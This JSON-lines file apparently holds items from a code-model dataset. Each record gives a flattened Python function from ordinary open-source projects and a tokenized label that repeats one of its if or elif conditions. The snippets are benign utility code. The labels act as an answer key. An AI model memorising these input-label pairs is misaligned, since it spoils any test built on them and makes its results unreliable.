{"input": "def get_all_fix_names(fixer_pkg, remove_prefix=True): \"\"\"Return a sorted list of all available fix names in the given package.\"\"\" pkg = __import__(fixer_pkg, [], [], [\"*\"]) fixer_dir = os.path.dirname(pkg.__file__) fix_names = [] for name in sorted(os.listdir(fixer_dir)): if name.startswith(\"fix_\") and name.endswith(\".py\"): if remove_prefix: name = name[4:] fix_names.append(name[:-3]) return fix_names", "label": "if remove_prefix :"}
{"input": "def extract_info_to_dest(self, info, dest): \"\"\"Extracts the given info to a directory and checks the file size.\"\"\" self.zip_file.extract(info, dest) dest = os.path.join(dest, info.filename) if not os.path.isdir(dest): # Directories consistently report their size incorrectly. size = os.stat(dest)[stat.ST_SIZE] if size != info.file_size: log.error( \"Extraction error, uncompressed size: %s, %s not %s\" % (self.source, size, info.file_size) ) raise forms.ValidationError(gettext(\"Invalid archive.\"))", "label": "if size != info . file_size :"}
{"input": "def _close_brackets(self, fragment): # If there any unclosed brackets in the text we try to close them # and we return part with closing brackets if they are \"closable\" stack = [] for char in fragment: if char in self._PARENS.keys(): stack.append(char) elif char in self._PARENS.values(): if stack and self._PARENS[stack[-1]] == char: stack.pop() else: return \"\" return \"\".join(self._PARENS[paren] for paren in reversed(stack))", "label": "if char in self . _PARENS . keys ( ) :"}
{"input": "def __call__(self, input_tensors, shape): if self.order in \"KA\": if any(t.order == TensorOrder.C_ORDER for t in input_tensors): order = TensorOrder.C_ORDER else: order = TensorOrder.F_ORDER else: if self.order == \"C\": order = TensorOrder.C_ORDER else: order = TensorOrder.F_ORDER return self.new_tensor(input_tensors, shape=shape, dtype=self.dtype, order=order)", "label": "if self . order == \"C\" :"}
{"input": "def __iter__(self): iteration = self.start_iter while iteration <= self.num_iterations: # if the underlying sampler has a set_epoch method, like # DistributedSampler, used for making each process see # a different split of the dataset, then set it if hasattr(self.batch_sampler.sampler, \"set_epoch\"): self.batch_sampler.sampler.set_epoch(iteration) for batch in self.batch_sampler: iteration += 1 if iteration > self.num_iterations: break yield batch", "label": "if hasattr ( self . batch_sampler . sampler , \"set_epoch\" ) :"}
{"input": "def all_pairs_shortest_path(adjacency_matrix): new_array = copy.deepcopy(adjacency_matrix) for k in range(len(new_array)): for i in range(len(new_array)): for j in range(len(new_array)): if new_array[i][j] > new_array[i][k] + new_array[k][j]: new_array[i][j] = new_array[i][k] + new_array[k][j] return new_array", "label": "if new_array [ i ] [ j ] > new_array [ i ] [ k ] + new_array [ k ] [ j ] :"}
{"input": "def cancel_pp(self, nzo_id): \"\"\"Change the status, so that the PP is canceled\"\"\" for nzo in self.history_queue: if nzo.nzo_id == nzo_id: nzo.abort_direct_unpacker() if nzo.pp_active: nzo.pp_active = False try: # Try to kill any external running process self.external_process.kill() logging.info( \"Killed external process %s\", self.external_process.args[0] ) except: pass return True return None", "label": "if nzo . pp_active :"}
{"input": "def cvPreprocess(): import cv2 imgarr_orig = [] image_ext_list = [\".jpg\", \".png\", \".JPEG\", \".jpeg\", \".PNG\", \".JPG\"] for file in onlyfiles: fimg = imgroot + file if any([x in image_ext_list for x in fimg]): print(fimg + \" is not an image file\") continue img1 = cv2.imread(fimg) if img1 is None: print(\"ERROR opening \", fimg) continue img1 = cv2.resize(img1, (896, 896)) imgarr_orig.append(img1) return imgarr_orig", "label": "if img1 is None :"}
{"input": "def substituteargs(self, pattern, replacement, old): new = [] for k in range(len(replacement)): item = replacement[k] newitem = [item[0], item[1], item[2]] for i in range(3): if item[i] == \"*\": newitem[i] = old[k][i] elif item[i][:1] == \"$\": index = int(item[i][1:]) - 1 newitem[i] = old[index][i] new.append(tuple(newitem)) ##self.report(\"old: %r\", old) ##self.report(\"new: %r\", new) return new", "label": "elif item [ i ] [ : 1 ] == \"$\" :"}
{"input": "def process(self, profile): contributors = self.createContributors(profile) for contributor in contributors: if contributor.type == \"SQLOperator\": reasons = self.createExecSqlNodeReason(contributor, profile) else: reasons = self.createExecNodeReason(contributor, profile) contributor.reason = reasons return contributors", "label": "if contributor . type == \"SQLOperator\" :"}
{"input": "def showImage(filename): osName = platform.system() if osName == \"Windows\": subprocess.Popen([filename], shell=True) elif osName == \"Linux\": # TODO: should I leave it to user's config ? LINUX_DISPLAY_COMMAND = (\"xdg-open\", \"display\", \"gvfs-open\", \"shotwell\") commands = list(filter(HasCommand, LINUX_DISPLAY_COMMAND)) if commands: # command found subprocess.Popen([commands[0], filename]) else: raise elif osName == \"Darwin\": # by @Naville subprocess.Popen([\"open\", filename]) else: raise Exception(\"other system\")", "label": "if commands :"}
{"input": "def add_libdirs(self, envvar, sep, fatal=False): v = os.environ.get(envvar) if not v: return for dir in str.split(v, sep): dir = str.strip(dir) if not dir: continue dir = os.path.normpath(dir) if os.path.isdir(dir): if not dir in self.library_dirs: self.library_dirs.append(dir) elif fatal: fail(\"FATAL: bad directory %s in environment variable %s\" % (dir, envvar))", "label": "if os . path . isdir ( dir ) :"}
{"input": "def add(self, state): if state.key in self: if attributes.instance_state(self._dict[state.key]) is not state: raise sa_exc.InvalidRequestError( \"Can't attach instance \" \"%s; another instance with key %s is already \" \"present in this session.\" % (orm_util.state_str(state), state.key) ) return False else: self._dict[state.key] = state.obj() self._manage_incoming_state(state) return True", "label": "if attributes . instance_state ( self . _dict [ state . key ] ) is not state :"}
{"input": "def request(self, stream=None, tty=None, demux=None): assert stream is not None and tty is not None and demux is not None with APIClient(base_url=self.address, version=DEFAULT_DOCKER_API_VERSION) as client: if tty: url = client._url(\"/tty\") else: url = client._url(\"/no-tty\") resp = client._post(url, stream=True) return client._read_from_socket(resp, stream=stream, tty=tty, demux=demux)", "label": "if tty :"}
{"input": "def select(model, path, iter_, paths_): (paths, first) = paths_ value = model.get_value(iter_) if value is None: return not bool(paths) value = normalize_path(value) if value in paths: self.get_child().get_selection().select_path(path) paths.remove(value) if not first: self.get_child().set_cursor(path) # copy treepath, gets invalid after the callback first.append(path.copy()) else: for fpath in paths: if fpath.startswith(value): self.get_child().expand_row(path, False) return not bool(paths)", "label": "if not first :"}
{"input": "def _validate(self, qobj): for experiment in qobj.experiments: if \"measure\" not in [op.name for op in experiment.instructions]: logger.warning( \"no measurements in circuit '%s', \" \"classical register will remain all zeros.\", experiment.header.name, )", "label": "if \"measure\" not in [ op . name for op in experiment . instructions ] :"}
{"input": "def exitval_from_opts(options, project): exit_value_from = options.get(\"--exit-code-from\") if exit_value_from: if not options.get(\"--abort-on-container-exit\"): log.warning(\"using --exit-code-from implies --abort-on-container-exit\") options[\"--abort-on-container-exit\"] = True if exit_value_from not in [s.name for s in project.get_services()]: log.error( 'No service named \"%s\" was found in your compose file.', exit_value_from ) sys.exit(2) return exit_value_from", "label": "if exit_value_from not in [ s . name for s in project . get_services ( ) ] :"}
{"input": "def __call__(self, tokens, reader): first_return = False for token in tokens: if not hasattr(reader.context.current_function, \"exit_count\"): reader.context.current_function.exit_count = 1 first_return = True if token == \"return\": if first_return: first_return = False else: reader.context.current_function.exit_count += 1 yield token", "label": "if not hasattr ( reader . context . current_function , \"exit_count\" ) :"}
{"input": "def _register_builtin_handlers(self, events): for spec in handlers.BUILTIN_HANDLERS: if len(spec) == 2: event_name, handler = spec self.register(event_name, handler) else: event_name, handler, register_type = spec if register_type is handlers.REGISTER_FIRST: self._events.register_first(event_name, handler) elif register_type is handlers.REGISTER_LAST: self._events.register_last(event_name, handler)", "label": "elif register_type is handlers . REGISTER_LAST :"}
{"input": "def test_sql(self): with self.get_temp() as temp: railroad = to_railroad(simpleSQL) assert len(railroad) == 7 temp.write(railroad_to_html(railroad)) if self.railroad_debug(): print(\"sql: \" + temp.name)", "label": "if self . railroad_debug ( ) :"}
{"input": "def resources_to_link(self, resources): if isinstance(self.Bucket, dict) and \"Ref\" in self.Bucket: bucket_id = self.Bucket[\"Ref\"] if not isinstance(bucket_id, string_types): raise InvalidEventException( self.relative_id, \"'Ref' value in S3 events is not a valid string.\" ) if bucket_id in resources: return {\"bucket\": resources[bucket_id], \"bucket_id\": bucket_id} raise InvalidEventException( self.relative_id, \"S3 events must reference an S3 bucket in the same template.\" )", "label": "if bucket_id in resources :"}
{"input": "def list_target_unit_files(self, *modules): # -> [ (unit,enabled) ] \"\"\"show all the target units and the enabled status\"\"\" result = {} enabled = {} for unit in _all_common_targets: result[unit] = None enabled[unit] = \"static\" if unit in _all_common_enabled: enabled[unit] = \"enabled\" if unit in _all_common_disabled: enabled[unit] = \"enabled\" return [(unit, enabled[unit]) for unit in sorted(result)]", "label": "if unit in _all_common_disabled :"}
{"input": "def teardown_network_port(self): \"\"\"tearDown for Network and Port table\"\"\" networks = self.quantum.get_all_networks(\"t1\") for net in networks: netid = net[\"net-id\"] name = net[\"net-name\"] if \"net\" in name: ports = self.quantum.get_all_ports(netid) for por in ports: self.quantum.delete_port(netid, por[\"port-id\"]) self.quantum.delete_network(netid)", "label": "if \"net\" in name :"}
{"input": "def findConfigFiles(self, cfg_args): \"\"\"Find available config files\"\"\" filenames = cfg_args.config[:] proj_opts = (\"unittest.cfg\", \"nose2.cfg\") for fn in proj_opts: if cfg_args.top_level_directory: fn = os.path.abspath(os.path.join(cfg_args.top_level_directory, fn)) filenames.append(fn) if cfg_args.user_config: user_opts = (\"~/.unittest.cfg\", \"~/.nose2.cfg\") for fn in user_opts: filenames.append(os.path.expanduser(fn)) return filenames", "label": "if cfg_args . top_level_directory :"}
{"input": "def make_aware(value): if settings.USE_TZ: # naive datetimes are assumed to be in UTC. if timezone.is_naive(value): value = timezone.make_aware(value, timezone.utc) # then convert to the Django configured timezone. default_tz = timezone.get_default_timezone() value = timezone.localtime(value, default_tz) return value", "label": "if timezone . is_naive ( value ) :"}
{"input": "def update(id): \"\"\"Update a post if the current user is the author.\"\"\" post = get_post(id) if request.method == \"POST\": title = request.form[\"title\"] body = request.form[\"body\"] error = None if not title: error = \"Title is required.\" if error is not None: flash(error) else: post.title = title post.body = body db.session.commit() return redirect(url_for(\"blog.index\")) return render_template(\"blog/update.html\", post=post)", "label": "if error is not None :"}
{"input": "def copyfileobj(src, dest, length=512): if hasattr(src, \"readinto\"): buf = bytearray(length) while True: sz = src.readinto(buf) if not sz: break if sz == length: dest.write(buf) else: b = memoryview(buf)[:sz] dest.write(b) else: while True: buf = src.read(length) if not buf: break dest.write(buf)", "label": "if not buf :"}
{"input": "def imgFileProcessingTick(output): if isinstance(output, tuple): workerOutput.append(output) workerPool.terminate() else: for page in output: if page is not None: options.imgMetadata[page[0]] = page[1] options.imgOld.append(page[2]) if GUI: GUI.progressBarTick.emit(\"tick\") if not GUI.conversionAlive: workerPool.terminate()", "label": "if not GUI . conversionAlive :"}
{"input": "def process_word(word): if word.parent == \"remapping\": raise UDError(\"There is a cycle in a sentence\") if word.parent is None: head = int(word.columns[HEAD]) if head > len(ud.words) - sentence_start: raise UDError( \"HEAD '{}' points outside of the sentence\".format(word.columns[HEAD]) ) if head: parent = ud.words[sentence_start + head - 1] word.parent = \"remapping\" process_word(parent) word.parent = parent", "label": "if head :"}
{"input": "def validate_export(namespace): destination = namespace.destination if destination == \"file\": if namespace.path is None or namespace.format_ is None: raise CLIError(\"usage error: --path PATH --format FORMAT\") elif destination == \"appconfig\": if (namespace.dest_name is None) and (namespace.dest_connection_string is None): raise CLIError(\"usage error: --config-name NAME | --connection-string STR\") elif destination == \"appservice\": if namespace.appservice_account is None: raise CLIError(\"usage error: --appservice-account NAME_OR_ID\")", "label": "if namespace . path is None or namespace . format_ is None :"}
{"input": "def get_change_set_status(context, stack_name, change_set_name): try: response = retry_boto_call( context.client.describe_change_set, ChangeSetName=change_set_name, StackName=stack_name, ) except ClientError as e: if e.response[\"Error\"][\"Code\"] == \"ChangeSetNotFound\": return None else: raise e return response[\"Status\"]", "label": "if e . response [ \"Error\" ] [ \"Code\" ] == \"ChangeSetNotFound\" :"}
{"input": "def predict(self, predict_data): assert self.predict_fn is not None # For the batch by batch prediction case, we do not want to include the cost of # doing final outputs concatenation into time measurement with Timer() as t: if self.batch_benchmark: self.predictions = self.predict_fn(predict_data) else: self.predictions = self.predict_fn(predict_data, concatenate_outputs=False) if not self.batch_benchmark: self.predictions = np.concatenate(self.predictions) return t.interval", "label": "if self . batch_benchmark :"}
{"input": "def __str__(self): s = \"(\" + str(self[0]) s += \", \" if isinstance(self[1], Tensor): if self[1].name and self[1].name is not None: s += self[1].name else: s += \"tensor-\" + hex(id(self[1])) else: s += str(self[1]) s += \", \" if isinstance(self[2], Tensor): if self[2].name and self[2].name is not None: s += self[2].name else: s += \"tensor-\" + hex(id(self[2])) else: s += str(self[2]) s += \")\" return s", "label": "if self [ 2 ] . name and self [ 2 ] . name is not None :"}
{"input": "def get_local_cache(self, past, data, from_file, temp_id): \"\"\"parse individual cached geometry if there is any\"\"\" cache = [] if self.accumulative: if from_file and len(past) > 0: cache = past[temp_id] if not from_file and len(data) > 0: cache = data.get(temp_id, []) return cache", "label": "if from_file and len ( past ) > 0 :"}
{"input": "def get_mappings(index): mappings = {} from kitsune.search.models import get_mapping_types for cls in get_mapping_types(): group = cls.get_index_group() if index == write_index(group) or index == read_index(group): mappings[cls.get_mapping_type_name()] = cls.get_mapping() return mappings", "label": "if index == write_index ( group ) or index == read_index ( group ) :"}
{"input": "def find_first_of_filetype(content, filterfiltype, attr=\"name\"): \"\"\"Find the first of the file type.\"\"\" filename = \"\" for _filename in content: if isinstance(_filename, str): if _filename.endswith(f\".{filterfiltype}\"): filename = _filename break else: if getattr(_filename, attr).endswith(f\".{filterfiltype}\"): filename = getattr(_filename, attr) break return filename", "label": "if isinstance ( _filename , str ) :"}
{"input": "def _timer( duetime: typing.AbsoluteOrRelativeTime, period: Optional[typing.RelativeTime] = None, scheduler: Optional[typing.Scheduler] = None, ) -> Observable: if isinstance(duetime, datetime): if period is None: return observable_timer_date(duetime, scheduler) else: return observable_timer_duetime_and_period(duetime, period, scheduler) if period is None: return observable_timer_timespan(duetime, scheduler) return observable_timer_timespan_and_period(duetime, period, scheduler)", "label": "if period is None :"}
{"input": "def __getattribute__(self, attrname): result = object.__getattribute__(self, attrname) if result is NOT_SET: try: self._read_info(attrname) except Exception as e: logging.warning( \"An error '%s' was raised while decoding '%s'\", e, repr(self.path) ) result = object.__getattribute__(self, attrname) if result is NOT_SET: result = self.INITIAL_INFO[attrname] return result", "label": "if result is NOT_SET :"}
{"input": "def on_btOK_clicked(self, *a): \"\"\"Handler for OK button\"\"\" if self.ac_callback is not None: self._set_title() if self._mode == ActionEditor.AEC_MENUITEM: self.ac_callback(self.id, self) else: a = self.generate_modifiers( self._action, self._selected_component.NAME == \"custom\" ) self.ac_callback(self.id, a) self.ac_callback = None if self._selected_component: self._selected_component.on_ok(a) self.close()", "label": "if self . _mode == ActionEditor . AEC_MENUITEM :"}
{"input": "def execute(): if frappe.db.get_value(\"Company\", {\"country\": \"India\"}, \"name\"): address_template = frappe.db.get_value(\"Address Template\", \"India\", \"template\") if not address_template or \"gstin\" not in address_template: set_up_address_templates(default_country=\"India\")", "label": "if not address_template or \"gstin\" not in address_template :"}
{"input": "def is_ncname(name): first = name[0] if first == \"_\" or category(first) in NAME_START_CATEGORIES: for i in xrange(1, len(name)): c = name[i] if not category(c) in NAME_CATEGORIES: if c in ALLOWED_NAME_CHARS: continue return 0 # if in compatibility area # if decomposition(c)!='': # return 0 return 1 else: return 0", "label": "if c in ALLOWED_NAME_CHARS :"}
{"input": "def _get_sonnet_version(): with open(\"sonnet/__init__.py\") as fp: for line in fp: if line.startswith(\"__version__\"): g = {} exec(line, g) # pylint: disable=exec-used return g[\"__version__\"] raise ValueError(\"`__version__` not defined in `sonnet/__init__.py`\")", "label": "if line . startswith ( \"__version__\" ) :"}
{"input": "def disjoined(self): gridscope = GridScope(globals=self.globals) for key in self.user_added: value = self[key] if isinstance(value, np.ndarray): grid = vaex.utils.disjoined(value) gridscope[key] = grid else: gridscope[key] = value return gridscope", "label": "if isinstance ( value , np . ndarray ) :"}
{"input": "def _maybe_uncompress(self): if not self._decompressed: compression_type = self.compression_type if compression_type != self.CODEC_NONE: data = memoryview(self._buffer)[self._pos :] if compression_type == self.CODEC_GZIP: uncompressed = gzip_decode(data) if compression_type == self.CODEC_SNAPPY: uncompressed = snappy_decode(data.tobytes()) if compression_type == self.CODEC_LZ4: uncompressed = lz4_decode(data.tobytes()) self._buffer = bytearray(uncompressed) self._pos = 0 self._decompressed = True", "label": "if compression_type != self . CODEC_NONE :"}
{"input": "def read_chat_forever(reader, pub_socket): line = reader.readline() who = \"someone\" while line: print(\"Chat:\", line.strip()) if line.startswith(\"name:\"): who = line.split(\":\")[-1].strip() try: pub_socket.send_pyobj((who, line)) except socket.error as e: # ignore broken pipes, they just mean the participant # closed its connection already if e[0] != 32: raise line = reader.readline() print(\"Participant left chat.\")", "label": "if line . startswith ( \"name:\" ) :"}
{"input": "def items(self, section=None): section = section if section is not None else Settings.DEFAULT_SECTION result = {\"section\": section} try: if section in self._global_settings.sections(): for option in self._global_settings.options(section): result[option] = self._global_settings.get(section, option) if section in self._local_settings.sections(): for option in self._local_settings.options(section): result[option] = self._local_settings.get(section, option) except configparser.InterpolationSyntaxError: core.termwarn(\"Unable to parse settings file\") return result", "label": "if section in self . _global_settings . sections ( ) :"}
{"input": "def before_train(self, program): \"\"\"doc\"\"\" if self.summary_record: if self.summary_record.scalar: self.s_name, self.s_tolog = zip(*self.summary_record.scalar) else: self.s_name, self.s_tolog = [], [] if self.summary_record.histogram: self.h_name, self.h_tolog = zip(*self.summary_record.histogram) else: self.h_name, self.h_tolog = [], []", "label": "if self . summary_record . histogram :"}
{"input": "def _s3_init(self): \"\"\"Initialize s3 bucket.\"\"\" try: bucket_exists = yield self._bucket_exists() if not bucket_exists: LOGGER.warning(\"Will attempt to create bucket\") yield self._create_bucket() except botocore.exceptions.NoCredentialsError: LOGGER.error( 'You must set \"s3.accessKeyId\" and \"s3.secretAccessKey\", or ' '\"s3.profile\" in your Streamlit configuration.' ) raise errors.S3NoCredentials", "label": "if not bucket_exists :"}
{"input": "def id2unit(self, id): items = [] for v, k in zip(id, self._id2unit.keys()): if v == EMPTY_ID: continue if self.keyed: items.append(\"{}={}\".format(k, self._id2unit[k][v])) else: items.append(self._id2unit[k][v]) res = self.sep.join(items) if res == \"\": res = \"_\" return res", "label": "if v == EMPTY_ID :"}
{"input": "def forward(model: TransformerListener, docs, is_train): if is_train: model.verify_inputs(docs) return model._outputs, model.backprop_and_clear else: if len(docs) == 0: outputs = [] elif any(doc._.trf_data is None for doc in docs): width = model.get_dim(\"nO\") outputs = [ TransformerData.zeros(len(doc), width, xp=model.ops.xp) for doc in docs ] else: outputs = [doc._.trf_data for doc in docs] return outputs, lambda d_data: []", "label": "if len ( docs ) == 0 :"}
{"input": "def get_plugin_dir(shooting_dir): DIRNAME = \"lunapark\" parent = os.path.abspath(os.path.join(shooting_dir, os.pardir)) if os.path.basename(parent) == DIRNAME: return parent else: plugin_dir = os.path.join(parent, DIRNAME) if not os.path.exists(plugin_dir): os.makedirs(plugin_dir) return plugin_dir", "label": "if not os . path . exists ( plugin_dir ) :"}
{"input": "def _get_plugin(self, name, lang=None, check=False): if lang is None: lang = self.get_lang() if name not in self.plugin_attrib_map: return None plugin_class = self.plugin_attrib_map[name] if plugin_class.is_extension: if (name, None) in self.plugins: return self.plugins[(name, None)] else: return None if check else self.init_plugin(name, lang) else: if (name, lang) in self.plugins: return self.plugins[(name, lang)] else: return None if check else self.init_plugin(name, lang)", "label": "if ( name , None ) in self . plugins :"}
{"input": "def globs_relative_to_buildroot(self): buildroot = get_buildroot() globs = [] for bundle in self.bundles: fileset = bundle.fileset if fileset is None: continue elif hasattr(fileset, \"filespec\"): globs += bundle.fileset.filespec[\"globs\"] else: # NB(nh): filemap is an OrderedDict, so this ordering is stable. globs += [fast_relpath(f, buildroot) for f in bundle.filemap.keys()] super_globs = super().globs_relative_to_buildroot() if super_globs: globs += super_globs[\"globs\"] return {\"globs\": globs}", "label": "elif hasattr ( fileset , \"filespec\" ) :"}
{"input": "def running_jobs(self, exit_on_error=True): \"\"\"Initialize multiprocessing.\"\"\" with self.handling_exceptions(): if self.using_jobs: from concurrent.futures import ProcessPoolExecutor try: with ProcessPoolExecutor(self.jobs) as self.executor: yield finally: self.executor = None else: yield if exit_on_error: self.exit_on_error()", "label": "if self . using_jobs :"}
{"input": "def _get_all_checkpoint_paths(self) -> List[str]: \"\"\"Returns all the checkpoint paths managed by the instance.\"\"\" # Due to tensorflow/issues/19378, we cannot use `tf.io.gfile.glob` here # because it returns directory contents recursively on Windows. if tf.io.gfile.exists(self._root_dir): root_dir_entries = tf.io.gfile.listdir(self._root_dir) return [ os.path.join(self._root_dir, e) for e in root_dir_entries if e.startswith(self._prefix) ] else: return []", "label": "if e . startswith ( self . _prefix )"}
{"input": "def test_tag_priority(self): for tag in _low_priority_D_TAG: val = ENUM_D_TAG[tag] # if the low priority tag is present in the descriptions, # assert that it has not overridden any other tag if _DESCR_D_TAG[val] == tag: for tag2 in ENUM_D_TAG: if tag2 == tag: continue self.assertNotEqual(ENUM_D_TAG[tag2], val)", "label": "if tag2 == tag :"}
{"input": "def cycle(self, forward=True): if self.cycle_list: if forward is True: self.cycle_list.rotate(-1) elif forward is False: self.cycle_list.rotate(1) self.move_to_obj(self.cycle_list[0])", "label": "elif forward is False :"}
{"input": "def __init__(self): self.keyring = None if not haveKeyring: return try: self.keyring = gnomekeyring.get_default_keyring_sync() if self.keyring == None: # Code borrowed from # http://trac.gajim.org/browser/src/common/passwords.py self.keyring = \"default\" try: gnomekeyring.create_sync(self.keyring, None) except gnomekeyring.AlreadyExistsError: pass except: logging.exception(\"Error determining keyring\") self.keyring = None", "label": "if self . keyring == None :"}
{"input": "def _coerce_trials_data(data, path): if not isinstance(data, list): if not isinstance(data, dict): raise BatchFileError( path, \"invalid data type for trials: expected list or dict\" \", got %s\" % type(data).__name__, ) data = [data] for item in data: if not isinstance(item, dict): raise BatchFileError( path, \"invalid data type for trial %r: expected dict\" % item ) return data", "label": "if not isinstance ( data , dict ) :"}
{"input": "def update(self): if self.openfilename is not None: try: current_mtime = os.stat(self.openfilename).st_mtime except OSError: return True if current_mtime != self.last_mtime: self.last_mtime = current_mtime self.reload() return True", "label": "if current_mtime != self . last_mtime :"}
{"input": "def _wrap_new_compiler(*args, **kwargs): try: return func(*args, **kwargs) except errors.DistutilsPlatformError: if not sys.platform == \"win32\": CCompiler = _UnixCCompiler else: CCompiler = _MSVCCompiler return CCompiler(None, kwargs[\"dry_run\"], kwargs[\"force\"])", "label": "if not sys . platform == \"win32\" :"}
{"input": "def _run_eagerly(*inputs): # pylint: disable=missing-docstring with context.eager_mode(): constants = [ _wrap_as_constant(value, tensor_spec) for value, tensor_spec in zip(inputs, input_signature) ] output = fn(*constants) if hasattr(output, \"_make\"): return output._make([tensor.numpy() for tensor in output]) if isinstance(output, (tuple, list)): return [tensor.numpy() for tensor in output] else: return output.numpy()", "label": "if isinstance ( output , ( tuple , list ) ) :"}
{"input": "def _on_event_MetadataAnalysisFinished(self, event, data): with self._selectedFileMutex: if self._selectedFile: self._setJobData( self._selectedFile[\"filename\"], self._selectedFile[\"filesize\"], self._selectedFile[\"sd\"], self._selectedFile[\"user\"], )", "label": "if self . _selectedFile :"}
{"input": "def env_asset_url_default(endpoint, values): \"\"\"Create asset URLs dependent on the current env\"\"\" if endpoint == \"views.themes\": path = values.get(\"path\", \"\") static_asset = path.endswith(\".js\") or path.endswith(\".css\") direct_access = \".dev\" in path or \".min\" in path if static_asset and not direct_access: env = values.get(\"env\", current_app.env) mode = \".dev\" if env == \"development\" else \".min\" base, ext = os.path.splitext(path) values[\"path\"] = base + mode + ext", "label": "if static_asset and not direct_access :"}
{"input": "def __init__(self, inStr): \"\"\"Initialize the class.\"\"\" inStr = inStr.strip() if len(inStr) != 1 and len(inStr) != 2: raise ValueError(\"PosAlign: length not 2 chars\" + inStr) if inStr == \"..\": self.aa = \"-\" self.gap = 1 else: self.gap = 0 self.aa = inStr[0] if self.aa == self.aa.lower(): self.aa = \"C\" if len(inStr) == 2: self.ss = inStr[1].upper() else: self.ss = \"0\"", "label": "if self . aa == self . aa . lower ( ) :"}
{"input": "def iter_ReassignParameters(self, inputNode, variables, nodeByID): for node in inputNode.getReassignParameterNodes(nodeByID): yield from iterNodeCommentLines(node) yield from iterInputConversionLines(node, variables) socket = node.inputs[0] if socket.isUnlinked and socket.isCopyable(): expression = getCopyExpression(socket, variables) else: expression = variables[socket] if node.conditionSocket is None: conditionPrefix = \"\" else: conditionPrefix = \"if {}: \".format(variables[node.conditionSocket]) yield \"{}{} = {}\".format( conditionPrefix, variables[node.linkedParameterSocket], expression )", "label": "if node . conditionSocket is None :"}
{"input": "def init_weight(self): if self.pretrained is not None: load_entire_model(self, self.pretrained) else: for sublayer in self.sublayers(): if isinstance(sublayer, nn.Conv2D): kaiming_normal_init(sublayer.weight) elif isinstance(sublayer, (nn.BatchNorm, nn.SyncBatchNorm)): kaiming_normal_init(sublayer.weight)", "label": "elif isinstance ( sublayer , ( nn . BatchNorm , nn . SyncBatchNorm ) ) :"}
{"input": "def logic(): while 1: if reset == ACTIVE_LOW: yield reset.posedge for i in range(20): yield clock.posedge if enable: count.next = i j = 1 while j < 25: if enable: yield clock.posedge yield clock.posedge count.next = 2 * j j += 1", "label": "if reset == ACTIVE_LOW :"}
{"input": "def clean_log_messages(result_data): for idx in range(len(result_data[\"executePlan\"][\"stepEvents\"])): message = result_data[\"executePlan\"][\"stepEvents\"][idx].get(\"message\") if message is not None: result_data[\"executePlan\"][\"stepEvents\"][idx][\"message\"] = re.sub( r\"(\\d+(\\.\\d+)?)\", \"{N}\", message ) return result_data", "label": "if message is not None :"}
{"input": "def headerData(self, section, orientation, role=Qt.DisplayRole): if role == Qt.TextAlignmentRole: if orientation == Qt.Horizontal: return to_qvariant(int(Qt.AlignHCenter | Qt.AlignVCenter)) return to_qvariant(int(Qt.AlignRight | Qt.AlignVCenter)) if role != Qt.DisplayRole: return to_qvariant() if orientation == Qt.Horizontal: if section == NAME: return to_qvariant(\"Name\") elif section == VERSION: return to_qvariant(\"Version\") elif section == ACTION: return to_qvariant(\"Action\") elif section == DESCRIPTION: return to_qvariant(\"Description\") return to_qvariant()", "label": "elif section == ACTION :"}
{"input": "def _gather_infos(self): # Carry over information from previous game step. if self._prev_state is not None: for attr in self._tracked_infos: self.state[attr] = self.state.get(attr) or self._prev_state.get(attr) for info in [\"score\", \"moves\"]: if self.state[info] is not None and type(self.state[info]) is not int: self.state[info] = int(self.state[info].strip()) self.state[\"won\"] = \"*** The End ***\" in self.state[\"feedback\"] self.state[\"lost\"] = \"*** You lost! ***\" in self.state[\"feedback\"]", "label": "if self . state [ info ] is not None and type ( self . state [ info ] ) is not int :"}
{"input": "def calc_parity(sig, kind): if kind in (\"zero\", \"none\"): return C(0, 1) elif kind == \"one\": return C(1, 1) else: bits, _ = value_bits_sign(sig) even_parity = sum([sig[b] for b in range(bits)]) & 1 if kind == \"odd\": return ~even_parity elif kind == \"even\": return even_parity else: assert False", "label": "if kind == \"odd\" :"}
{"input": "def tool(self, **kwds): process_definition = kwds.get(\"process_definition\", None) if process_definition is None: raw_process_reference = kwds.get(\"raw_process_reference\", None) if raw_process_reference is None: raw_process_reference = self.raw_process_reference(kwds[\"path\"]) process_definition = self.process_definition(raw_process_reference) tool = load_tool.make_tool( process_definition.uri, process_definition.loading_context, ) return tool", "label": "if raw_process_reference is None :"}
{"input": "def context(self): # Needed to avoid Translate Toolkit construct ID # as context\\04source if self.template is not None: if self.template.id: return self.template.id if self.template.context: return self.template.context return self.template.getid() return self.unescape_csv(self.mainunit.getcontext())", "label": "if self . template . context :"}
{"input": "def test_six_thread_safety(): _reload_six() with patch( \"botocore.vendored.six.moves.__class__.__setattr__\", wraps=_wrapped_setattr ): threads = [] for i in range(2): t = _ExampleThread() threads.append(t) t.start() while threads: t = threads.pop() t.join() if t.exc_info: six.reraise(*t.exc_info)", "label": "if t . exc_info :"}
{"input": "def _handle_js_events(self, change): if self.js_events: if self.eventHandlers: for event in self.js_events: event_name = event[\"name\"] if event_name in self.eventHandlers: self.eventHandlers[event_name](event[\"detail\"]) # clears the event queue. self.js_events = []", "label": "if event_name in self . eventHandlers :"}
{"input": "def single_discriminator(x, filters=128, kernel_size=8, strides=4, pure_mean=False): \"\"\"A simple single-layer convolutional discriminator.\"\"\" with tf.variable_scope(\"discriminator\"): net = layers().Conv2D( filters, kernel_size, strides=strides, padding=\"SAME\", name=\"conv1\" )(x) if pure_mean: net = tf.reduce_mean(net, [1, 2]) else: net = mean_with_attention(net, \"mean_with_attention\") return net", "label": "if pure_mean :"}
{"input": "def find_path(self, from_location, to_location): end = to_location f_node = self.mh.get_node(from_location) self.on.append(f_node) self.o.append(f_node.lid) next_node = f_node counter = 0 # a bail-out counter while next_node is not None: if counter > 10000: break # no path found under limit finish = self._handle_node(next_node, end) if finish: return self._trace_path(finish) next_node = self._get_best_open_node() counter += 1 return None", "label": "if counter > 10000 :"}
{"input": "def format_var_dict(dct, indent=4, max_width=80): lines = [] pre = \" \" * indent for key, value in dct.items(): line = pre + key + \" = \" + repr(value) if len(line) > max_width: line = line[: max_width - 3] + \"...\" try: value_len = len(value) except: pass else: line += \"\\n\" + pre + \"len(%s) = %s\" % (key, value_len) lines.append(line) return \"\\n\".join(lines)", "label": "if len ( line ) > max_width :"}
